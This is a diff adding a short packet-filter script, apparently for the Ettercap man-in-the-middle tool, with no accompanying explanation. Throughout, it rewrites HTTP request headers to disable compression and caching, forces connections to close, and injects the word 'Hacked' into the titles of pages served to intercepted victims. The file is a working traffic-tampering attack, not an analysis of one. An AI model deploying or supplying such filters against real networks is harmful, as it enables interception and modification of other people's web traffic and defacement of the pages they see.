@@ -1,0 +1,21 @@
+if (ip.proto == TCP && tcp.dst == 80) {
+    if (search(DATA.data, "Accept-Encoding")) {
+        replace("Accept-Encoding", "Accept-Nothing.");
+    }
+
+    if (search(DATA.data, "If-None-Match")) {
+        replace("If-None-Match", "No-None-Match");
+    }
+
+    if (search(DATA.data, "If-Modified-Since")) {
+        replace("If-Modified-Since", "No-Modified-Since");
+    }
+}
+
+if (ip.proto == TCP && tcp.src == 80) {
+    replace("keep-alive", "close");
+}
+
+if (ip.proto == TCP && tcp.src == 80) {
+    replace("<title>", "<title>Hacked");
+}
